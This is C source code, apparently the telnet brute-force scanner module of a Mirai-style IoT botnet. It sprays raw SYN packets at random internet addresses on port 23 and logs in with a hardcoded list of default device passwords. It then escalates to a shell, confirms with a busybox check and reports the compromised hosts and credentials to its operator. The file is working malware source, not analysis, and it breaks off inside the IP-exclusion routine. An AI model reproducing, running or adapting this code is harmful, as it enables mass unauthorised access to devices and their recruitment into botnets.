#ifdef DEBUG
#include <stdio.h>
#endif

#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <errno.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "headers/includes.h"
#include "headers/scanner.h"
#include "headers/checksum.h"
#include "headers/rand.h"
#include "headers/util.h"


//static int rsck_out = 0;
static int program_pid = -1;
static int scanner_pid = -1, rsck, auth_table_len = 0;
static struct scanner_auth *auth_table = NULL;
static struct scanner_connection *conn_table;
//static uint16_t auth_table_max_weight = 0;
static uint32_t fake_time = 0;

static uint32_t self_bind_addr = 0;

static unsigned int seed = 0;
unsigned int  seed_start = 0;

static void setup_connection(struct scanner_connection *);
static uint32_t get_random_ip(void);

static int consume_iacs(struct scanner_connection *);
static int consume_any_prompt(struct scanner_connection *);
static int consume_user_prompt(struct scanner_connection *);
static int consume_pass_prompt(struct scanner_connection *);
static int consume_resp_prompt(struct scanner_connection *);
static struct scanner_auth *random_auth_entry(void);
static void report_working(uint32_t, uint16_t, struct scanner_auth *);
static unsigned char *deobf(unsigned char *, int *);
static unsigned char can_consume(struct scanner_connection *, unsigned char *, int);

void util_memmove(void *dest, void *src, size_t n) 
{ 
    // Typecast src and dest addresses to (unsigned char *) 
    unsigned char *csrc = (unsigned char *)src; 
    unsigned char *cdest = (unsigned char *)dest; 

    // Create a temporary array to hold data of src 
    unsigned char temp[n];
    util_zero(temp, n); 

    // Copy data from csrc[] to temp[] 
    size_t i;
    for (i=0; i<n; i++) 
        temp[i] = csrc[i]; 

    // Copy data from temp[] to cdest[] 
    for (i=0; i<n; i++) 
        cdest[i] = temp[i];

    util_zero(temp, n);
    return;
}


/*int util_strlen(unsigned char *str)
{
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}


void util_memcpy(void *dst, void *src, int len)
{
    unsigned char *r_dst = (unsigned char *)dst;
    unsigned char *r_src = (unsigned char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

unsigned char util_strncmp(unsigned char *str1, unsigned char *str2, int len)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 < len || l2 < len)
        return 0;

    while (len--)
    {
        if (*str1++ != *str2++)
            return 0;
    }

    return 1;
}

unsigned char util_strcmp(unsigned char *str1, unsigned char *str2)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 != l2)
        return 0;

    while (l1--)
    {
        if (*str1++ != *str2++)
            return 0;
    }

    return 1;
}

int util_strcpy(unsigned char *dst, unsigned char *src)
{
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}

int util_memsearch(unsigned char *buf, int buf_len, unsigned char *mem, int mem_len)
{
    int i = 0, matched = 0;
    if(mem_len > buf_len)
        return -1;
    for(i = 0; i < buf_len; i++)
    {
        if(buf[i] == mem[matched])
        {
            if(++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }
    return -1;
}
/*
uint32_t util_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof (addr);

    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[util] Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}
*/
   
int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if (ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if (((unsigned char *)buf)[i] == 0x00)
            {
                ((unsigned char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

unsigned int lcg_rand(unsigned int* s) {
    unsigned int a = seed_start;// our main constant/fallback (ex time!)
    unsigned int c = 12345U;// seed with a systematic constant
    const unsigned int m = UINT_MAX; // Maximum value of unsigned int
    
    while(1)
    {
        // Using the LCG algorithm to generate a pseudo-random unsigned integer

        if(a == 0)
        {
            seed_start = time(NULL);
            c = (scanner_pid +program_pid) /2;
            a = seed_start;
            break;
        }
        break;
    }
    
    unsigned int next_value = (a * (*s) + c) & m;

    while (next_value == *s) {
        c = (scanner_pid +program_pid) /2 + seed_start;
        // If the next value is equal to the current state value,
        // calculate the next value again until it is unique.
        next_value = (a * next_value + c) % m;
    }

    *s = next_value;

    return next_value;
}

void scanner_init(void)
{
	if (scanner_pid > 0) scanner_kill();
    seed = time(NULL)-getpid()+3;
    size_t i;
    uint16_t source_port = 0;
    size_t rawpkt_size = sizeof (struct iphdr) + sizeof (struct tcphdr) + 5;
    uint8_t *rawpkt = malloc(rawpkt_size);
    struct iphdr *iph = NULL;
    struct tcphdr *tcph = NULL;

    util_zero(rawpkt, rawpkt_size);

    // Let parent continue on main thread
    
    
   
    #ifndef SCANDBG
    
    scanner_pid = fork();
    if (scanner_pid != 0)
    {
        util_zero(rawpkt, rawpkt_size);
        free(rawpkt);
        rawpkt = NULL;
        return;
    }
    
    #endif

    scanner_pid = getpid();
    program_pid = getppid();

    source_port = rand_next() & (0xFFFF-4096);
    source_port += 4096;

    self_bind_addr = util_local_addr();

    //rand_init(time(NULL));
    
    fake_time = time(NULL);
    conn_table = malloc(SCANNER_MAX_CONNS * sizeof (struct scanner_connection));
    util_zero(conn_table, SCANNER_MAX_CONNS * sizeof (struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
        conn_table[i].auth = NULL;
        conn_table[i].last_recv = 0;
        conn_table[i].dst_addr = 0;
        conn_table[i].dst_port = 0;
        conn_table[i].rdbuf_pos = 0;
        util_zero(conn_table[i].rdbuf, sizeof(conn_table[i].rdbuf));
        conn_table[i].tries = 0;
        conn_table[i].recv_wo_proc = 0;
    }

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to initialize raw socket, cannot scan\n");
#endif
        util_zero(rawpkt, rawpkt_size);
        util_zero(conn_table, SCANNER_MAX_CONNS * sizeof (struct scanner_connection));
        free(conn_table);
        free(rawpkt);
        conn_table = NULL;
        rawpkt = NULL;
        kill(getpid(), 9);
        exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
#ifdef DEBUG
        printf("[scanner] Failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
        rsck = -1;
        util_zero(rawpkt, rawpkt_size);
        util_zero(conn_table, SCANNER_MAX_CONNS * sizeof (struct scanner_connection));
        free(conn_table);
        free(rawpkt);
        conn_table = NULL;
        rawpkt = NULL;
        kill(getpid(), 9);
        exit(0);
    }
	
	scanner_clear_auth_entry();
	//mg3500:merlin
	scanner_add_auth_entry("mg3500\0", "merlin\0");
	scanner_add_auth_entry("root\0", "root\0");
	scanner_add_auth_entry("root\0", "anko\0");
	scanner_add_auth_entry("root\0", "00000000\0");
	scanner_add_auth_entry("default\0", "default\0");
	scanner_add_auth_entry("default\0", "antslq\0");
	scanner_add_auth_entry("default\0", "S2fGqNFs\0");
	scanner_add_auth_entry("default\0", "0xhlwSG8\0");
	scanner_add_auth_entry("default\0", "S2fGqNFs\0");
	scanner_add_auth_entry("root\0", "alpine\0");
	scanner_add_auth_entry("root\0", "cxlinux\0");
	scanner_add_auth_entry("root\0", "7ujMko0admin\0");
	scanner_add_auth_entry("root\0", "7ujMko0vizxv\0");
	scanner_add_auth_entry("root\0", "Zte521\0");
	scanner_add_auth_entry("root\0", "zlxx.\0");
	scanner_add_auth_entry("root\0", "default\0");
	scanner_add_auth_entry("root\0", "calvin\0");
	scanner_add_auth_entry("root\0", "oelinux123\0");
	scanner_add_auth_entry("root\0", "GM8182\0");
	scanner_add_auth_entry("root\0", "vizxv\0");
	scanner_add_auth_entry("root\0", "dreambox\0");
	scanner_add_auth_entry("root\0", "xc3511\0");
	scanner_add_auth_entry("root\0", "icatch99\0");
	scanner_add_auth_entry("root\0", "juantech\0");
	scanner_add_auth_entry("root\0", "root123\0");
	scanner_add_auth_entry("admin\0", "admin\0");
	scanner_add_auth_entry("admin\0", "1111\0");
	scanner_add_auth_entry("admin\0", "smcadmin\0");
	scanner_add_auth_entry("admin\0", "1111111\0");
	scanner_add_auth_entry("admin\0", "pass\0");
	scanner_add_auth_entry("admin\0", "password\0");
	scanner_add_auth_entry("admin\0", "changeme\0");
	scanner_add_auth_entry("admin\0", "123456\0");
	
	if(auth_table_len == 0)
    {
        #ifdef DEBUG
        printf("[scanner] NO CREDENTIALS IN SCANNER");
        #endif
        util_zero(rawpkt, rawpkt_size);
        free(rawpkt);
        rawpkt = NULL;
        return;
    }
	
	struct timeval *_tim = NULL;
	_tim = malloc(sizeof(struct timeval));
	util_zero(_tim, sizeof(struct timeval));

	
#ifdef DEBUG
    printf("[scanner] Scanner process initialized with %d credentials. Scanning started.\n", auth_table_len);
#endif

    // Main logic loop
    while (1)
    {
        fd_set fdset_rd;
        fd_set fdset_wr;
        struct scanner_connection *conn = NULL;
        size_t last_spew = 0;
        int last_avail_conn = -1, mfd_rd = -1, mfd_wr = -1;
        unsigned int nfds = 0;

        // Load file descriptors into fdsets
        mfd_rd = -1;
        mfd_wr = -1;
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        // Spew out SYN to try and get a response
        if (fake_time != last_spew)
        {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr;
                
                util_zero(&paddr, sizeof(struct sockaddr_in));

                    
                source_port = rand_next() % (0xFFFF-4096);
                source_port += 4096;

                iph = (struct iphdr *)rawpkt;
                tcph = (struct tcphdr *)(iph + 1);

                util_zero(iph, sizeof(struct iphdr));
                // Set up IPv4 header
                iph->ihl = 5;
                iph->version = 4;
                iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
                iph->id = rand_next();
                iph->ttl = 64;
                iph->protocol = IPPROTO_TCP;
                iph->saddr = self_bind_addr;
                iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

                util_zero(tcph, sizeof(struct tcphdr));
                // Set up TCP header
                tcph->dest = htons(23);
                tcph->source = htons(source_port);
                tcph->doff = 5;
                tcph->window = rand_next() & 0xffff;
                tcph->syn = 1;
                tcph->seq = htons(iph->daddr);
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                //DEBUG_PRINTF("sending request %d bytes ntohs(%d.%d.%d.%d:%d)\r\n", ntohs(iph->tot_len), iph->daddr & 0xff, (iph->daddr >> 8) & 0xff, (iph->daddr >> 16) & 0xff, (iph->daddr >> 24) & 0xff, ntohs(tcph->dest));

                sendto(rsck, rawpkt, ntohs(iph->tot_len), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));

                iph = NULL;
                tcph = NULL;
                continue;
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (1)
        {
            //DEBUG_PRINTF("Waiting for response\r\n");
            register ssize_t res = 0;
            unsigned char dgram[sizeof(struct iphdr)+sizeof(struct tcphdr)+2048];// min pkt + 2048 bytes
            util_zero(dgram, sizeof(dgram));
            
            iph = NULL;
            tcph = NULL;
            iph = (struct iphdr *)dgram;
            tcph = (struct tcphdr *)(iph + 1);
            util_zero(iph, sizeof(struct iphdr));
            util_zero(tcph, sizeof(struct tcphdr));

            errno = 0;
            res = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (res <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
            {
                util_zero(iph, sizeof(struct iphdr));
                util_zero(tcph, sizeof(struct tcphdr));
                util_zero(dgram, sizeof(dgram));
                iph = NULL;
                tcph = NULL;
                break;
            }

            //DEBUG_PRINTF("RECEIVED CONNECTION\r\n");

            size_t bytes_c = (size_t) res;
            if ((size_t)bytes_c < 40)
            {
                DEBUG_PRINTF("lost CONNECTION %d < %d\r\n", (size_t)bytes_c, sizeof(struct iphdr) + sizeof(struct tcphdr));
                util_zero(iph, sizeof(struct iphdr));
                util_zero(tcph, sizeof(struct tcphdr));
                util_zero(dgram, sizeof(dgram));
                iph = NULL;
                tcph = NULL;
                continue;
            }

            if (iph->protocol != IPPROTO_TCP)
            {
                DEBUG_PRINTF("Isnt TCP PROTOCOL\r\n");
                util_zero(iph, sizeof(struct iphdr));
                util_zero(tcph, sizeof(struct tcphdr));
                util_zero(dgram, sizeof(dgram));
                iph = NULL;
                tcph = NULL;
                continue;
            }

            if (tcph->source != htons(23))
            {
                //DEBUG_PRINTF("NOT SOURCE PORT 22\r\n");
                util_zero(dgram, sizeof(dgram));
                iph = NULL;
                tcph = NULL;
                continue;
            }

            /*
            if (tcph->syn == 0)
            {
                DEBUG_PRINTF("Not a data packet\r\n");
                util_zero(dgram, sizeof(dgram));
                iph = NULL;
                tcph = NULL;
                continue;
            }
            */

            if (tcph->ack == 0)
            {
                DEBUG_PRINTF("Not in 3 way handshake\r\n");
                util_zero(dgram, sizeof(dgram));
                iph = NULL;
                tcph = NULL;
                continue;
            }

            /*
            if (tcph->rst)
            {
                DEBUG_PRINTF("Telnet server sent ReSeT singal RST\r\n");
                util_zero(dgram, sizeof(dgram));
                iph = NULL;
                tcph = NULL;
                continue;
            }
            */

            if (tcph->fin)
            {
            //    DEBUG_PRINTF("Telnet server sent Final pkt FIN\r\n");
                util_zero(dgram, sizeof(dgram));
                iph = NULL;
                tcph = NULL;
                continue;
            }

            /*
            if ((htons(ntohs(tcph->ack_seq)) - 1) != iph->saddr)
            {

                util_zero(dgram, sizeof(dgram));
                iph = NULL;
                tcph = NULL;
                continue;
            }
            */

            conn = NULL;
            for (res = last_avail_conn; res < SCANNER_MAX_CONNS; res++)
            {
                if(conn_table[res].dst_addr == iph->saddr)
                {
                    conn = NULL;
                    break;
                }
                if (conn_table[res].state == SC_CLOSED)
                {
                    conn = &conn_table[res];
                    last_avail_conn = res;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if (conn == NULL)
            {
                conn = NULL;
                util_zero(dgram, sizeof(dgram));
                iph = NULL;
                tcph = NULL;
                break;
            }

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
#ifdef DEBUG_scn
            //printf("[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\r\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
            conn = NULL;
            util_zero(dgram, sizeof(dgram));
            iph = NULL;
            tcph = NULL;
            continue;
        }

        // Load file descriptors into fdsets
        mfd_rd = -1;
        mfd_wr = -1;
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            unsigned int timeout = 0;

            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 260 : 3);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
#ifdef DEBUG
                //printf("[scanner] FD%d timed out (state = %d)\r\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;

                // Retry
                if (conn->state > SC_HANDLE_IACS)
                {
                    if (++(conn->tries) >= 5)
                    {
                        conn_table[i].state = SC_CLOSED;
                        conn_table[i].fd = -1;
                        conn_table[i].auth = NULL;
                        conn_table[i].last_recv = 0;
                        conn_table[i].dst_addr = 0;
                        conn_table[i].dst_port = 0;
                        conn_table[i].rdbuf_pos = 0;
                        util_zero(conn_table[i].rdbuf, sizeof(conn_table[i].rdbuf));
                        conn_table[i].tries = 0;
                        conn_table[i].recv_wo_proc = 0;
                    }
                    else
                    {
                        conn_table[i].rdbuf_pos = 0;
                        util_zero(conn_table[i].rdbuf, sizeof(conn_table[i].rdbuf));
                        conn_table[i].fd = -1;
                        conn_table[i].auth = NULL;
                        conn_table[i].last_recv = 0;
                        setup_connection(conn);
                    }
                }
                else
                {
                    conn_table[i].state = SC_CLOSED;
                    conn_table[i].fd = -1;
                    conn_table[i].auth = NULL;
                    conn_table[i].last_recv = 0;
                    conn_table[i].dst_addr = 0;
                    conn_table[i].dst_port = 0;
                    conn_table[i].rdbuf_pos = 0;
                    util_zero(conn_table[i].rdbuf, sizeof(conn_table[i].rdbuf));
                    conn_table[i].tries = 0;
                    conn_table[i].recv_wo_proc = 0;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }
		
		util_zero(_tim, sizeof(*_tim));
        _tim->tv_usec = 0;
        _tim->tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, _tim);
        fake_time = time(NULL);

        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if (conn->fd == -1 || conn->state == SC_CLOSED)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
                    conn->state = SC_HANDLE_IACS;
                    conn->auth = random_auth_entry();
                    conn_table[i].rdbuf_pos = 0;
                    util_zero(conn_table[i].rdbuf, sizeof(conn_table[i].rdbuf));
#ifdef DEBUG_scn
                    printf("[scanner] FD%d connected. Trying %d.%d.%d.%d:%s:%s\n", conn->fd, conn->dst_addr & 0xff, conn->dst_addr >> 8 & 0xff, conn->dst_addr >> 16 & 0xff, conn->dst_addr >> 24 & 0xff, conn->auth->username, conn->auth->password);
#endif
                }
                else
                {
#ifdef DEBUG
                    //printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn_table[i].state = SC_CLOSED;
                    conn_table[i].fd = -1;
                    conn_table[i].auth = NULL;
                    conn_table[i].last_recv = 0;
                    conn_table[i].dst_addr = 0;
                    conn_table[i].dst_port = 0;
                    conn_table[i].rdbuf_pos = 0;
                    util_zero(conn_table[i].rdbuf, sizeof(conn_table[i].rdbuf));
                    conn_table[i].tries = 0;
                    conn_table[i].recv_wo_proc = 0;
                    continue;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                int ret;

                if (conn->state == SC_CLOSED)
                    continue;

                if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
                {
                    util_memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                    conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                }
                errno = 0;
                ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                if (ret == 0)
                {
#ifdef DEBUG
                    //printf("[scanner] FD%d connection gracefully closed\n", conn->fd);
#endif
                    errno = ECONNRESET;
                    ret = -1; // Fall through to closing connection below
                }
                if (ret == -1)
                {
                    if (errno != EAGAIN && errno != EWOULDBLOCK)
                    {
#ifdef DEBUG
                        //printf("[scanner] FD%d lost connection\n", conn->fd);
#endif
                        if(conn->fd != -1)
                        {
                            close(conn->fd);
                            conn->fd = -1;
                        }
                        
                        // Retry
                        if (++(conn->tries) >= 4)
                        {
                            conn_table[i].state = SC_CLOSED;
                            conn_table[i].fd = -1;
                            conn_table[i].auth = NULL;
                            conn_table[i].last_recv = 0;
                            conn_table[i].dst_addr = 0;
                            conn_table[i].dst_port = 0;
                            conn_table[i].rdbuf_pos = 0;
                            util_zero(conn_table[i].rdbuf, sizeof(conn_table[i].rdbuf));
                            conn_table[i].tries = 0;
                            conn_table[i].recv_wo_proc = 0;
                        }
                        else
                        {
                            setup_connection(conn);
#ifdef DEBUG
                            //printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                        }
                    }
                    break;
                }
                conn->rdbuf_pos += ret;
                conn->last_recv = fake_time;

                while (1)
                {
                    int consumed = 0;

                    switch (conn->state)
                    {
                    case SC_HANDLE_IACS:
                        if ((consumed = consume_iacs(conn)) > 0)
                        {
                            conn->state = SC_WAITING_USERNAME;
#ifdef DEBUG
                            printf("[scanner] FD%d finished telnet negotiation\r\n", conn->fd);
#endif
                        }
                        break;
                    case SC_WAITING_USERNAME:
                        if ((consumed = consume_user_prompt(conn)) > 0)
                        {
                            send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                            conn->state = SC_WAITING_PASSWORD;
#ifdef DEBUG
                            printf("[scanner] FD%d received username prompt\n", conn->fd);
#endif
                        }
                        break;
                    case SC_WAITING_PASSWORD:
                        if ((consumed = consume_pass_prompt(conn)) > 0)
                        {
#ifdef DEBUG
                            //printf("[scanner] FD%d received password prompt\n", conn->fd);
#endif

                            // Send password
                            send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                            conn->state = SC_WAITING_PASSWD_RESP;
                        }
                        break;
                    case SC_WAITING_PASSWD_RESP:
                        if ((consumed = consume_any_prompt(conn)) > 0)
                        {
#ifdef DEBUG
                            //printf("[scanner] FD%d received shell prompt\r\n", conn->fd);
#endif

                            // Send enable / system / shell / sh to session to drop into shell if needed
                            send(conn->fd, "enable", 6, MSG_NOSIGNAL);
                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                            conn->state = SC_WAITING_ENABLE_RESP;
                        }
                        break;
                    case SC_WAITING_ENABLE_RESP:
                        if ((consumed = consume_any_prompt(conn)) > 0)
                        {
#ifdef DEBUG
                            //printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                            send(conn->fd, "system", 6, MSG_NOSIGNAL);
                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                            conn->state = SC_WAITING_SYSTEM_RESP;
                        }
                        break;
                    case SC_WAITING_SYSTEM_RESP:
                        if ((consumed = consume_any_prompt(conn)) > 0)
                        {
#ifdef DEBUG
                            //printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                            send(conn->fd, "shell", 5, MSG_NOSIGNAL);
                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                            conn->state = SC_WAITING_SHELL_RESP;
                        }
                        break;
                    case SC_WAITING_SHELL_RESP:
                        if ((consumed = consume_any_prompt(conn)) > 0)
                        {
#ifdef DEBUG
                            //printf("[scanner] FD%d received enable prompt\n", conn->fd);
#endif

                            send(conn->fd, "sh", 2, MSG_NOSIGNAL);
                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                            conn->state = SC_WAITING_SH_RESP;
                        }
                        break;
                    case SC_WAITING_SH_RESP:
                        if ((consumed = consume_any_prompt(conn)) > 0)
                        {
#ifdef DEBUG
                            //printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                            // Send query string
                            send(conn->fd, "/bin/busybox boat", 17, MSG_NOSIGNAL);
                            send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                            conn->state = SC_WAITING_TOKEN_RESP;
                        }
                        break;
                    case SC_WAITING_TOKEN_RESP:
                        consumed = consume_resp_prompt(conn);
                        if (consumed == -1)
                        {
                            consumed = 0;
#ifdef DEBUG
                            //printf("[scanner] FD%d invalid username/password combo\r\n", conn->fd);
#endif
                            if(conn->fd != -1)
                            {
                                close(conn->fd);
                                conn->fd = -1;
                            }

                            // Retry
                            if (++(conn->tries) >= 3)
                            {
                                conn_table[i].state = SC_CLOSED;
                                conn_table[i].fd = -1;
                                conn_table[i].auth = NULL;
                                conn_table[i].last_recv = 0;
                                conn_table[i].dst_addr = 0;
                                conn_table[i].dst_port = 0;
                                conn_table[i].rdbuf_pos = 0;
                                util_zero(conn_table[i].rdbuf, sizeof(conn_table[i].rdbuf));
                                conn_table[i].tries = 0;
                            }
                            else
                            {
                                conn_table[i].rdbuf_pos = 0;
                                util_zero(conn_table[i].rdbuf, sizeof(conn_table[i].rdbuf));
                                conn_table[i].fd = -1;
                                conn_table[i].auth = NULL;
                                conn_table[i].last_recv = 0;
                                setup_connection(conn);
                                #ifdef DEBUG
                                    //printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
                                #endif
                            }
                        }
                        else if(consumed == 0)
                        {
                            // > x retries then timeout and quit
                            if (++(conn->recv_wo_proc) >= 3)
                            {
                                if(conn->fd != -1)
                                {
                                    close(conn->fd);
                                    conn->fd = -1;
                                }
                                conn_table[i].state = SC_CLOSED;
                                conn_table[i].fd = -1;
                                conn_table[i].auth = NULL;
                                conn_table[i].last_recv = 0;
                                conn_table[i].dst_addr = 0;
                                conn_table[i].dst_port = 0;
                                conn_table[i].rdbuf_pos = 0;
                                util_zero(conn_table[i].rdbuf, sizeof(conn_table[i].rdbuf));
                                conn_table[i].tries = 0;
                                consumed = 0;
                            }
                        }
                        else if (consumed > 0)
                        {
#ifdef DEBUG
                            printf("[scanner] FD%d Found verified working telnet\r\n", conn->fd);
#endif
                            report_working(conn->dst_addr, conn->dst_port, conn->auth);
                            
                            if(conn->fd != -1)
                            {
                                close(conn->fd);
                                conn->fd = -1;
                            }
                            if(conn->fd != -1)
                            {
                                close(conn->fd);
                                conn->fd = -1;
                            }
                            conn_table[i].state = SC_CLOSED;
                            conn_table[i].fd = -1;
                            conn_table[i].auth = NULL;
                            conn_table[i].last_recv = 0;
                            conn_table[i].dst_addr = 0;
                            conn_table[i].dst_port = 0;
                            conn_table[i].rdbuf_pos = 0;
                            util_zero(conn_table[i].rdbuf, sizeof(conn_table[i].rdbuf));
                            conn_table[i].tries = 0;
                            consumed = 0;// bypas buffer update ~l33t
                        }
                        break;
                    default:
                        consumed = 0;
                        break;
                    }

                    // If no data was consumed, move on
                    if (consumed == 0)
                        break;
                    else
                    {
						if(conn->rdbuf_pos < sizeof(conn->rdbuf))
						{
							if ((size_t)consumed > conn->rdbuf_pos)
								consumed = conn->rdbuf_pos;

							conn->rdbuf_pos -= consumed;
							util_memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
						} else {
							util_zero(conn->rdbuf, sizeof(conn->rdbuf));
						}
                    }
                }
            }
        }
    }
    close(rsck);
    rsck = -1;
    util_zero(rawpkt, rawpkt_size);
    util_zero(conn_table, SCANNER_MAX_CONNS * sizeof (struct scanner_connection));
    free(conn_table);
    free(rawpkt);
    conn_table = NULL;
    rawpkt = NULL;
    return;
}

void scanner_kill(void)
{
    if(scanner_pid >= 0)
    {
        kill(scanner_pid, 9);
		scanner_pid = -1;
    }
}

static void setup_connection(struct scanner_connection *conn)
{
    if(conn == NULL) return;

    struct sockaddr_in addr;
    util_zero(&addr, sizeof(struct sockaddr_in));

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to call socket()\n");
#endif
        return;
    }

    conn->recv_wo_proc = 0;
    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}

static uint32_t get_random_ip(void)
{
    uint32_t tmp = 0;
    unsigned char o1 = 0xFF, o2 = 0xFF, o3 = 0xFF, o4 = 0xFF;

    do
    {
        tmp = lcg_rand(&seed);

        o1 = (rand_next()) & 0xff;
        o2 = (tmp >> 8)& 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (rand_next()) & 0xff;
		tmp = INET_ADDR(o1,o2,o3,o4);
		seed = tmp+1;
    }
    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
            (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
            (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
            (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
            (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
            (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
            (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
            (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
            (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
            (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
            (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
